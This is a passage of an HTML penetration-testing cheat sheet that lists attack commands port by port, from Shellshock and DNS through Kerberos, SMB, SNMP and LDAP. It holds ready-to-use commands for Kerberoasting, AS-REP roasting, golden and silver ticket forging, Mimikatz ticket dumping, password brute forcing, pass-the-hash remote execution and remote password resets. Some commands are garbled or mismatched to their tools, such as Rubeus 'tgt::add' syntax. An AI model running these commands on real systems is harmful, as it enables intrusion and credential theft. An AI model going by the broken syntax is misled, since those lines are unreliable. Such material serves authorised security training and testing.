nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls [ip]
                
# Reference: https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
python2 shellshock.py &lt;target_ip&gt; &lt;username&gt;@&lt;domain&gt; &lt;attacker_ip&gt; 139 &lt;root&gt;@&lt;domain&gt;

# Example: python2 shellshock.py 192.168.1.100 emmanuel@domain.local 192.168.1.50 139 admin@domain.local
</code></pre>
              <h4 id="145-53-dns">1.4.5 53: DNS</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53 &lt;target_ip&gt;
</code></pre>
              <p><strong>Enumerating AD Domain via DNS</strong></p>
              <pre><code class="language-bash">nmap -p 53 --script &quot;dns-nsid,dns-srv-enum&quot; &lt;target_ip&gt;
</code></pre>
              <p><strong>Basic DNS Enumeration</strong></p>
              <pre><code class="language-bash">dig axfr &lt;domain_name&gt; @&lt;dns_server_ip&gt;  # Attempt zone transfer
dig ANY &lt;domain_name&gt; @&lt;dns_server_ip&gt;  # Retrieve all records
nslookup
&gt; server &lt;dns_server_ip&gt;
&gt; set type=any
&gt; &lt;domain_name&gt;  # Query any records
</code></pre>
              <p><strong>Zone Transfer</strong></p>
              <pre><code class="language-bash">dnsrecon -d &lt;domain_name&gt; -n &lt;dns_server_ip&gt; -t axfr

dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver &lt;dns_server_ip&gt; &lt;domain_name&gt;
</code></pre>
              <p><strong>Reverse Lookup</strong></p>
              <pre><code class="language-bash">nmap -sL &lt;target_ip_range&gt; | grep &quot;Nmap scan report&quot;  # Reverse DNS lookup for a range
</code></pre>
              <p><strong>DNS Cache Snooping</strong></p>
              <pre><code class="language-bash">dig @&lt;dns_server_ip&gt; -t A +norecurse &lt;target_domain&gt;
</code></pre>
              <p><strong>Enumerate DNS with PowerShell (Windows)</strong></p>
              <pre><code class="language-powershell">Resolve-DnsName -Name &lt;domain_name&gt; -Server &lt;dns_server_ip&gt; -DnsOnly
</code></pre>
              <h4 id="146-69-tftp">1.4.6 69: TFTP</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -p 69 --script tftp-enum &lt;target_ip&gt;
</code></pre>
              <p><strong>Enumeration Script</strong></p>
              <pre><code class="language-bash"># Usage: run the TFTP enumeration script to get a specific file
./tftp_enum.sh &lt;target_ip&gt; &lt;filename&gt;
./tftp_enum.sh 192.168.1.10 bootfile.bin
</code></pre>
              <pre><code class="language-bash">#!/bin/bash

# TFTP Enumeration Script
if [ &quot;$#&quot; -ne 2 ]; then
    echo &quot;Usage: $0 &lt;target_ip&gt; &lt;filename&gt;&quot;
    exit 1
fi

TARGET_IP=$1
FILENAME=$2

# Attempt to retrieve file from TFTP server
echo &quot;Attempting to retrieve $FILENAME from $TARGET_IP&quot;
tftp $TARGET_IP -c get $FILENAME

# Check if file was retrieved
if [ -f $FILENAME ]; then
    echo &quot;File $FILENAME successfully retrieved from $TARGET_IP&quot;
else
    echo &quot;Failed to retrieve $FILENAME from $TARGET_IP&quot;
fi
</code></pre>
              <p><strong>File Download</strong></p>
              <pre><code class="language-bash">tftp &lt;target_ip&gt; 69
tftp&gt; get &lt;remote_file&gt; &lt;local_file&gt;
tftp&gt; quit
</code></pre>
              <p><strong>File Upload</strong></p>
              <pre><code class="language-bash">tftp &lt;target_ip&gt; 69
tftp&gt; put &lt;local_file&gt; &lt;remote_file&gt;
tftp&gt; quit
</code></pre>
              <p><strong>Brute Force Download</strong></p>
              <pre><code class="language-bash">for i in $(cat &lt;file_list.txt&gt;); do tftp &lt;target_ip&gt; 69 -c get $i; done
</code></pre>
              <p><strong>Automating TFTP Operations</strong></p>
              <pre><code class="language-bash">echo -e &quot;get &lt;remote_file&gt; &lt;local_file&gt;\nquit&quot; | tftp &lt;target_ip&gt;
echo -e &quot;put &lt;local_file&gt; &lt;remote_file&gt;\nquit&quot; | tftp &lt;target_ip&gt;
</code></pre>
              <h4 id="147-88-kerberos">1.4.7 88: Kerberos</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash"># Check for Kerberos service availability and get basic information
nmap -p 88 --script kerberos-enum-users &lt;target_ip&gt;

# Check for common Kerberos vulnerabilities
nmap -p 88 --script kerberos-brute &lt;target_ip&gt;

# Enumerate SPNs (Service Principal Names)
nmap -p 88 --script krb5-enum-users,krb5-scan &lt;target_ip&gt;
</code></pre>
              <p><strong>Enumerate Kerberos Principal Names</strong>: use <code>kerbrute</code> to enumerate valid user
                accounts by attempting to authenticate with a list of usernames.</p>
              <pre><code class="language-bash">kerbrute userenum -d &lt;domain&gt; -p &lt;userlist&gt; &lt;target_ip&gt;
or
./kerbrute_linux_amd64 userenum -d &lt;target_ip&gt; /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
</code></pre>
              <p><strong>Perform Kerberos Ticket Extraction (AS-REP Roasting)</strong>: request
                <strong>non-preauthenticated Kerberos</strong> tickets for a list of users.
              </p>
              <pre><code class="language-bash">impacket-GetNPUsers -dc-ip &lt;dc_ip&gt; -request -usersfile &lt;userlist&gt; &lt;target_domain&gt;
</code></pre>
              <p><strong>Perform Kerberos Ticket Request with AS-REP Roasting</strong>: request a Ticket Granting Ticket
                (TGT) for a specific user.</p>
              <pre><code class="language-bash">impacket-GetTGT -dc-ip &lt;dc_ip&gt; -outputfile &lt;outputfile&gt; &lt;username&gt;@&lt;domain&gt;
</code></pre>
              <p><strong>Crack Kerberos Tickets</strong></p>
              <pre><code class="language-bash">john --wordlist=&lt;wordlist&gt; &lt;ticket_file&gt;
# or
hashcat -m 13100 &lt;ticket_file&gt; &lt;wordlist&gt;
</code></pre>
              <p><strong>Kerberos Ticket Extraction</strong>: request a TGT or Service Ticket (TGS) using specified
                credentials.</p>
              <pre><code class="language-bash"># Request a TGT (Ticket Granting Ticket)
python3 GetTGT.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;

# Request a Service Ticket (TGS)
python3 GetST.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;/&lt;username&gt;:&lt;password&gt; -spn &lt;service&gt;/&lt;target&gt;
</code></pre>
              <p><strong>Kerberoasting</strong>: extract and crack service tickets to gain access to service accounts.
              </p>
              <pre><code class="language-bash"># Extract all service tickets for offline cracking
impacket-GetUserSPNs -dc-ip &lt;dc_ip&gt; -outputfile &lt;tickets_file&gt; &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;

# Crack the extracted tickets with John the Ripper or Hashcat
john --wordlist=&lt;wordlist&gt; &lt;tickets_file&gt;
# or
hashcat -m 13100 &lt;tickets_file&gt; &lt;wordlist&gt;
</code></pre>
              <p><strong>Kerberos Brute Forcing</strong>: perform brute force attacks on Kerberos tickets.</p>
              <pre><code class="language-bash">krb5-brute -d &lt;domain&gt; -t &lt;target_ip&gt; -u &lt;username&gt; -p &lt;password_list&gt;
</code></pre>
              <p><strong>Kerberos Ticket Manipulation</strong>: use tools to request, manipulate, and renew Kerberos
                tickets for privilege escalation or impersonation.</p>
              <pre><code class="language-bash"># Renew a TGT (for Kerberos ticket manipulation)
python3 psexec.py &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;target_ip&gt; -impersonate-user &lt;target_user&gt;

# Perform Kerberos attacks with Rubeus
rubeus.exe asktgt /user:&lt;username&gt; /rc4:&lt;password&gt;
rubeus.exe tgtdeleg /user:&lt;username&gt; /rc4:&lt;password&gt;
rubeus.exe s4u /user:&lt;username&gt; /rc4:&lt;password&gt; /impersonateuser:&lt;target_user&gt;
</code></pre>
              <p><strong>Kerberos Ticket Dumping</strong>: extract Kerberos tickets from memory for offline analysis.
              </p>
              <pre><code class="language-powershell"># Dump Kerberos tickets from memory using Mimikatz
mimikatz &quot;lsadump::dcom&quot; &quot;sekurlsa::tickets /export&quot;
</code></pre>
              <p><strong>Kerberos Pre-Authentication</strong>: identify weak configurations that might allow attackers
                to perform brute force attacks.</p>
              <pre><code class="language-bash"># Test for weak pre-authentication configurations
python3 kerbrute.py -d &lt;domain&gt; -u &lt;user_list&gt; -p &lt;password_list&gt; -dc &lt;dc_ip&gt;
</code></pre>
              <p><strong>Kerberos Silver Ticket Attacks</strong>: forge high-value Kerberos tickets for access and
                privilege escalation.</p>
              <pre><code class="language-bash"># Create a silver ticket with Rubeus
rubeus.exe tgt::add /user:&lt;username&gt; /rc4:&lt;password&gt; /sid:&lt;domain_sid&gt; /domain:&lt;domain&gt;
</code></pre>
              <p><strong>Steps to Perform Silver Ticket Attack</strong></p>
              <pre><code class="language-bash"># 1. Obtain a Valid TGT (Ticket Granting Ticket)
impacket-GetTGT -dc-ip &lt;dc_ip&gt; -outputfile &lt;tgt_file&gt; &lt;user&gt;@&lt;domain&gt;

# 2. Forge a Silver Ticket
impacket-atexec -target-ip &lt;target_ip&gt; -service &lt;service&gt; -ticket &lt;ticket_file&gt; &lt;username&gt;
</code></pre>
              <p><strong>Kerberos Golden Ticket Attacks</strong>: forge high-value Kerberos tickets for access and
                privilege escalation.</p>
              <pre><code class="language-bash"># Create a golden ticket with Rubeus
rubeus.exe tgt::add /user:&lt;username&gt; /rc4:&lt;password&gt; /domain:&lt;domain&gt; /sid:&lt;domain_sid&gt; /rc4:&lt;krbtgt_hash&gt;
</code></pre>
              <p><strong>Steps to Perform Golden Ticket Attack</strong></p>
              <pre><code class="language-bash"># 1. Obtain KRBTGT NTLM Hash
impacket-secretsdump -outputfile &lt;dump_file&gt; &lt;target_domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;dc_ip&gt;

# 2. Generate a Golden Ticket
ticketer -user &lt;user&gt; -domain &lt;domain&gt; -sid &lt;domain_sid&gt; -krbtgt &lt;krbtgt_hash&gt; -output &lt;ticket_file&gt;

# 3. Use the Golden Ticket
impacket-smbexec -target-ip &lt;target_ip&gt; -ticket &lt;ticket_file&gt; &lt;username&gt;

# (Optional) Pass the Golden Ticket
impacket-psexec -target-ip &lt;target_ip&gt; -ticket &lt;ticket_file&gt; &lt;username&gt;
</code></pre>
              <p><strong>Additional Reference:</strong> <a
                  href="https://www.tarlogic.com/blog/how-to-attack-kerberos/">https://www.tarlogic.com/blog/how-to-attack-kerberos/</a>
              </p>
              <h4 id="148-110-pop3">1.4.8 110: POP3</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap --script &quot;pop3-capabilities or pop3-ntlm-info&quot; -sV -p 110 &lt;target_ip&gt;
</code></pre>
              <p><strong>Connect and test Login</strong></p>
              <pre><code class="language-bash"># Connect to the POP3 service
telnet &lt;target_ip&gt; 110

# Log in with a test user
USER &lt;username&gt;
PASS &lt;password&gt;

# List all messages
LIST

# Retrieve the first email
RETR 1
</code></pre>
              <p><strong>Brute Force Login</strong></p>
              <pre><code class="language-bash"># Standard brute force on POP3
hydra -l &lt;username&gt; -P &lt;password_list&gt; -f &lt;target_ip&gt; pop3 -V

# Brute force with SSL/TLS on POP3 over port 995
hydra -S -v -l &lt;username&gt; -P &lt;password_list&gt; -s 995 -f &lt;target_ip&gt; pop3 -V
</code></pre>
              <p><strong>Read Mail via Telnet</strong></p>
              <pre><code class="language-bash"># Connect to the POP3 service
telnet &lt;target_ip&gt; 110

# Log in with your credentials
USER &lt;username&gt;
PASS &lt;password&gt;

# List all messages
LIST

# Retrieve a specific email by its number
RETR &lt;mail_number&gt;

# Close the connection
QUIT
</code></pre>
              <h4 id="149-111-rpc">1.4.9 111: RPC</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -sV -p 111 --script=rpcinfo &lt;target_ip&gt;
</code></pre>
              <p><strong>Discover RPC Services Using RPCinfo</strong></p>
              <pre><code class="language-bash"># Use rpcinfo to get a list of registered RPC services on the target
rpcinfo -p &lt;target_ip&gt;
</code></pre>
              <p><strong>Identify Available RPC Services</strong></p>
              <pre><code class="language-bash"># Check available RPC services and their versions with showmount
showmount -e &lt;target_ip&gt;
</code></pre>
              <h4 id="1410-135-593-msrpc">1.4.10 135, 593: MSRPC</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -p 135 --script msrpc-enum &lt;target_ip&gt;
</code></pre>
              <p><strong>Enumerating MSRPC using <code>rpcdump</code></strong></p>
              <pre><code class="language-bash">rpcdump.py &lt;target_ip&gt; -p 135
</code></pre>
              <p><strong>Enumerate RPC over HTTP Services</strong></p>
              <pre><code class="language-bash"># Scan for RPC over HTTP services using Nmap
nmap -p 593 --script http-rpc-epmap &lt;target_ip&gt;
</code></pre>
              <p><strong>Enumerating RPC with <code>rpcclient</code></strong></p>
              <pre><code class="language-bash"># Connect with a null session
rpcclient -U &quot;&quot; -N &lt;target_ip&gt;

# Connect to the target and list available shares
rpcclient -U &quot;&quot; -N &lt;target_ip&gt; -c &quot;srvinfo&quot;

# List all available users
rpcclient -U &quot;&quot; -N &lt;target_ip&gt; -c &quot;enumdomusers&quot;

# Enumerate domain groups
rpcclient -U &quot;&quot; -N &lt;target_ip&gt; -c &quot;enumdomgroups&quot;

# Query user information
rpcclient -U &quot;&lt;username&gt;&quot; -W &quot;&lt;domain&gt;&quot; &lt;target_ip&gt; -c &quot;queryuser &lt;username&gt;&quot;
</code></pre>
              <p><strong>Commands for <code>rpcclient</code></strong></p>
              <pre><code class="language-plaintext">enumdomusers
enumdomgroups
queryuser 0x450
enumprinters
querydominfo
createdomuser
deletedomuser
lookupnames
lookupsids
lsaaddacctrights
lsaremoveacctrights
dsroledominfo
dsenumdomtrusts
</code></pre>
              <p><strong>User Enumeration</strong></p>
              <pre><code class="language-bash"># List Users
enumdomusers

# Get User Details
queryuser &lt;0xrid&gt;

# Get User Groups
queryusergroups &lt;0xrid&gt;

# Get User SID
lookupnames &lt;username&gt;

# Get User Aliases
queryuseraliases [builtin|domain] &lt;sid&gt;
</code></pre>
              <p><strong>Group Enumeration</strong></p>
              <pre><code class="language-bash"># List Groups
enumdomgroups

# Get Group Details
querygroup &lt;0xrid&gt;

# Get Group Members
querygroupmem &lt;0xrid&gt;
</code></pre>
              <p><strong>Alias Group Enumeration</strong></p>
              <pre><code class="language-bash"># List Aliases
enumalsgroups &lt;builtin|domain&gt;

# Get Members of Alias
queryaliasmem builtin|domain &lt;0xrid&gt;
</code></pre>
              <p><strong>Domain Enumeration</strong></p>
              <pre><code class="language-bash"># List Domains
enumdomains

# Obtain Domain SID
lsaquery

# Get Domain Information
querydominfo
</code></pre>
              <p><strong>Brute Force User/Password/SID</strong></p>
              <pre><code class="language-bash"># Nmap
nmap --script smb-brute.nse -p 445 &lt;IP&gt;

# CrackMapExec
crackmapexec smb &lt;IP&gt; -u &#39;admin&#39; -p wordlist_pass.txt
or
crackmapexec smb &lt;IP&gt; -u &#39;wordlist_user.txt&#39; -p password

# Lookup SID with Brute Force (requires that we have valid credentials and the domain name)
impacket-lookupsid [domain.com]/[userName]:[domain.com]@987@[ip]
</code></pre>
              <p><strong>Additional SID Information</strong></p>
              <pre><code class="language-bash">Find SID by Name
lookupnames &lt;username&gt;

# Find More SIDs
lsaenumsid

# Check RID Cycle for More SIDs
lookupsids &lt;sid&gt;
</code></pre>
              <p><strong>Set User Info with <code>rpcclient</code></strong></p>
              <pre><code class="language-bash">rpcclient -N &lt;target_ip&gt; -U &#39;&lt;username&gt;%&lt;password&gt;&#39; -c &quot;setuserinfo2 &lt;target_username&gt; 23 &#39;&lt;new_password&gt;&#39;&quot;
or 
rpcclient -U &quot;&quot; -N &lt;ip&gt; -c &quot;setuserinfo2 &lt;USER&gt; 23 &lt;NEW_PASSWORD&gt;&quot;
</code></pre>
              <p>The <code>setuserinfo</code> function in <code>rpcclient</code> is used to modify user account
                information on a remote Windows system. The <code>level</code> parameter indicates the detail of
                information to modify or retrieve:</p>
              <ul>
                <li><strong>Level 0:</strong> Basic info (username, full name).</li>
                <li><strong>Level 1:</strong> Additional info (home directory, script path).</li>
                <li><strong>Level 2:</strong> Further info (password age, privileges).</li>
                <li><strong>Level 3:</strong> Detailed info (all above + group memberships).</li>
                <li><strong>Level 4:</strong> Most detailed info (all above + SID).</li>
              </ul>
              <p>To change a user&#39;s password, use <code>setuserinfo2</code> with a level of 23. This level includes
                basic attributes and adds password management functionality. The <code>setuserinfo</code> function
                typically does not handle password changes directly; <code>setuserinfo2</code> is preferred for this
                purpose.</p>
              <h4 id="1411-139-445-smb">1.4.11 139, 445: SMB</h4>
              <p><strong>Host Enumeration</strong></p>
              <pre><code class="language-bash"># Nmap scan
nmap -v -p 139,445 [IP]
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery &lt;ip&gt;

# NetBIOS Scan
sudo nbtscan -r 192.168.50.0/24

# Windows Network View
net view \\[domainName] /all
</code></pre>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap --script smb-enum-shares.nse -p445 &lt;ip&gt;

nmap --script smb-enum-users.nse -p445 &lt;ip&gt;

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 &lt;ip&gt;

nmap -p139,445 --script &quot;smb-vuln-* and not(smb-vuln-regsvc-dos)&quot; --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 &lt;IP&gt;

nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 &lt;ip&gt;

nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 &lt;ip&gt;
</code></pre>
              <p><strong>Advanced Enumeration</strong></p>
              <pre><code class="language-bash"># Network Packet Analysis: captures and analyzes packets related to SMB traffic on port 139, looking for specific patterns
sudo ngrep -i -d &lt;INTERFACE&gt; &#39;s.?a.?m.?b.?a.*[[:digit:]]&#39; port 139

# Lists available SMB shares on the target
smbclient -L &lt;IP&gt;
</code></pre>
              <p><strong>SMB Enumeration with <code>smbmap</code></strong></p>
              <pre><code class="language-bash">smbmap -H &lt;IP&gt;
smbmap -u &#39;&#39; -p &#39;&#39; -H &lt;IP&gt;
smbmap -u &#39;guest&#39; -p &#39;&#39; -H &lt;IP&gt;
smbmap -u &#39;&#39; -p &#39;&#39; -H &lt;IP&gt; -R
</code></pre>
              <p><strong>SMB Enumeration with <code>crackmapexec</code></strong></p>
              <pre><code class="language-bash">crackmapexec smb &lt;IP&gt;
crackmapexec smb &lt;IP&gt; -u &#39;&#39; -p &#39;&#39;
crackmapexec smb &lt;IP&gt; -u &#39;guest&#39; -p &#39;&#39;
crackmapexec smb &lt;IP&gt; -u &#39;&#39; -p &#39;&#39; --shares
crackmapexec smb &lt;IP&gt; -u guest -p &quot;&quot; --rid-brute
crackmapexec smb &lt;IP&gt; -u &#39;[user]&#39; -p &#39;[password]&#39;
</code></pre>
              <p><strong>User Enumeration with <code>enum4linux</code></strong></p>
              <pre><code class="language-bash"># Basic information gathering on the domain
enum4linux -a &lt;IP&gt;
enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;IP&gt; &amp;&amp; enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;IP&gt;

# Extract domain users
enum4linux -U &lt;DOMAIN_IP&gt;

# Extract available domain shares
enum4linux -S &lt;IP&gt;

enum4linux -a -M -l -d &lt;ip&gt; 2&gt;&amp;1
enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;ip&gt;
enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;ip&gt;
enum4linux -a -u &quot;[user]&quot; -p &quot;[password]&quot; &lt;ip&gt;
</code></pre>
              <p><strong>SMB Client Operations</strong></p>
              <pre><code class="language-bash">smbclient --no-pass -L //&lt;ip&gt;
smbclient -L //&lt;ip&gt; -U [user]
smbclient //&lt;IP&gt;/&lt;SHARE&gt;
smbclient -N //&lt;IP&gt;/&lt;SHARE&gt;
smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt; -c &quot;prompt OFF;recurse ON;mget *&quot; # Change the timeout to download big files

# Change the timeout to download big files
help timeout
timeout 100

# Other commands
prompt off
recurse on
mget *
</code></pre>
              <p><strong>Brute Force Credentials</strong></p>
              <pre><code class="language-bash">crackmapexec smb &lt;IP&gt; -u &lt;USERS_LIST&gt; -p &lt;PASSWORDS_LIST&gt;
hydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; smb://&lt;IP&gt; -u -vV
</code></pre>
              <p><strong>Mounting Shares</strong></p>
              <pre><code class="language-bash"># Mounts SMB shares to a local directory for further access and manipulation.
mkdir /tmp/share
sudo mount -t cifs //&lt;IP&gt;/&lt;SHARE&gt; /tmp/share
sudo mount -t cifs -o &#39;username=&lt;USER&gt;,password=&lt;PASSWORD&gt;&#39; //&lt;IP&gt;/&lt;SHARE&gt; /tmp/share
</code></pre>
              <p><strong>Execute Remote Commands</strong></p>
              <pre><code class="language-bash"># PsExec
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# WMIexec
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# SMBexec
smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# AteExec
atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; &lt;COMMAND&gt;
atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;
</code></pre>
              <p><strong>Exploitation (EternalBlue - MS17-010):</strong> <a
                  href="https://github.com/3ndG4me/AutoBlue-MS17-010">https://github.com/3ndG4me/AutoBlue-MS17-010</a>
              </p>
              <p><strong>PsExec</strong></p>
              <pre><code class="language-bash"># Credentials
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;

# Pass the Hash
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# Testing with Crackmapexec
crackmapexec smb &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt; --psexec
crackmapexec smb &lt;IP&gt; -u &lt;USER&gt; -H &lt;NTHASH&gt; --psexec
</code></pre>
              <p><strong>WMIExec</strong></p>
              <pre><code class="language-bash"># Credentials
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;

# Pass the Hash
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

# Testing with Crackmapexec
crackmapexec wmiexec &lt;IP&gt; -u &lt;USER&gt; -p &lt;PASSWORD&gt;
crackmapexec wmiexec &lt;IP&gt; -u &lt;USER&gt; -H &lt;NTHASH&gt;
</code></pre>
              <h4 id="1412-143-993-imap">1.4.12 143, 993: IMAP</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -p 143,993 --script imap-ntlm-info &lt;ip&gt;
</code></pre>
              <p><strong>Banner Grabbing</strong>
                Connect to the server to identify software/version.</p>
              <pre><code class="language-bash">openssl s_client -connect &lt;target-ip&gt;:993
</code></pre>
              <p><strong>Search for Vulnerabilities</strong></p>
              <pre><code class="language-bash">searchsploit imap &lt;version&gt;
</code></pre>
              <p><strong>Check for Supported Capabilities</strong></p>
              <pre><code class="language-bash"># Usage
python3 check_imap.py &lt;target-ip&gt; &lt;port&gt;
</code></pre>
              <pre><code class="language-python">import imaplib
import sys

def check_imap_capabilities(host, port):
    if port == 993:
        mail = imaplib.IMAP4_SSL(host)
    else:
        mail = imaplib.IMAP4(host)
    
    print(mail.capabilities())

if __name__ == &quot;__main__&quot;:
    if len(sys.argv) != 3:
        print(&quot;Usage: python3 script.py &lt;host&gt; &lt;port&gt;&quot;)
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    check_imap_capabilities(host, port)
</code></pre>
              <h4 id="1413-161-udp-snmp">1.4.13 161 (UDP): SNMP</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">sudo nmap -sU --open -p 161 &lt;target-ip-range&gt; -oG open-snmp.txt

sudo nmap --script snmp-* -sU -p 161 &lt;target-ip&gt;

sudo nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=&lt;community-file&gt; &lt;target-ip&gt;
</code></pre>
              <p><strong>Basic Enumeration</strong></p>
              <pre><code class="language-bash"># Version: 1, 2c, 3
# Community String: public, private, security, etc
snmpwalk -v &lt;SNMP_VERSION&gt; -c &lt;COMMUNITY_STRING&gt; &lt;target-ip&gt; .1
</code></pre>
              <p><strong>Brute Force Community Strings</strong></p>
              <pre><code class="language-bash"># Popular wordlist: /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt

# Onesixtyone
onesixtyone -c &lt;community-file&gt; &lt;target-ip&gt;

# Snmpwalk
snmpwalk -c &lt;COMMUNITY_STRING&gt; -v &lt;SNMP_VERSION&gt; &lt;target-ip&gt;

# Snmpbulkwalk
snmpbulkwalk -c &lt;COMMUNITY_STRING&gt; -v &lt;SNMP_VERSION&gt; &lt;target-ip&gt;

# Snmp-check
snmp-check &lt;target-ip&gt;
</code></pre>
              <p><strong>Using <code>onesixtyone</code> Without a Community File</strong></p>
              <pre><code class="language-bash">echo &lt;community1&gt; &gt; community
echo &lt;community2&gt; &gt;&gt; community
echo &lt;community3&gt; &gt;&gt; community

for ip in $(seq 1 254); do echo &lt;target-network&gt;.&lt;ip&gt;; done &gt; ips

onesixtyone -c community -i ips
</code></pre>
              <p><strong>Extended Queries Enumeration</strong></p>
              <pre><code class="language-bash">snmpwalk -v &lt;SNMP_VERSION&gt; -c &lt;COMMUNITY_STRING&gt; &lt;target-ip&gt; NET-SNMP-EXTEND-MIB::nsExtendOutputFull
</code></pre>
              <p><strong>Advanced Enumeration with Specific OIDs</strong></p>
              <pre><code class="language-bash">snmpwalk -c &lt;COMMUNITY_STRING&gt; -v &lt;SNMP_VERSION&gt; &lt;target-ip&gt; &lt;OID&gt;
</code></pre>
              <p><strong>OID Specific Codes</strong></p>
              <pre><code class="language-plaintext">1.3.6.1.2.1.25.1.6.0 --&gt; System Processes
1.3.6.1.4.1.77.1.2.25 --&gt; User Accounts
1.3.6.1.2.1.6.13.1.3 --&gt; TCP Local Ports
1.3.6.1.2.1.25.4.2.1.2 --&gt; Running Programs
1.3.6.1.2.1.25.4.2.1.4 --&gt; Processes Path
1.3.6.1.2.1.25.2.3.1.4 --&gt; Storage Units
1.3.6.1.2.1.25.6.3.1.2 --&gt; Softyware Name
</code></pre>
              <p><strong>Additional Reference:</strong> <a
                  href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp</a>
              </p>
              <p><strong>Modifying SNMP Values:</strong> <a
                  href="http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html">http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html</a>
              </p>
              <h4 id="1414-389-636-3268--3269-ldap">1.4.14 389, 636, 3268 &amp; 3269: LDAP</h4>
              <p><strong>Nmap Scripting Scan</strong></p>
              <pre><code class="language-bash">nmap -n -sV --script &quot;ldap* and not brute&quot; &lt;target_ip&gt;
</code></pre>
              <p><strong>Ldapsearch Basic Enumeration</strong></p>
              <pre><code class="language-bash"># Basic LDAP query
ldapsearch -x -H ldap://&lt;target_ip&gt;

# Basic LDAP Search for a base-level
ldapsearch -h &lt;target_ip&gt; -x -s base

# Get Naming Contexts
ldapsearch -x -H ldap://&lt;target_ip&gt; -s base namingcontexts

# Search in a Specific Base Domain Name
ldapsearch -x -H ldap://&lt;target_ip&gt; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot;

# Enumerate users using LDAP
ldapsearch -v -x -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; -H &quot;ldap://&lt;target_ip&gt;&quot; &quot;(objectclass=*)&quot;

# Retrieve users Account Name
ldapsearch -v -x -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; -H &quot;ldap://&lt;target_ip&gt;&quot; &quot;(objectclass*)&quot; | grep sAMAccountName:

# Search with Filters
ldapsearch -x -H ldap://&lt;target_ip&gt; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; &quot;(objectclass=user)&quot;
ldapsearch -x -H ldap://&lt;target_ip&gt; -b &quot;DC=&lt;domain&gt;,DC=&lt;tld&gt;&quot; &quot;(objectclass=group)&quot;

# Searching with authentication
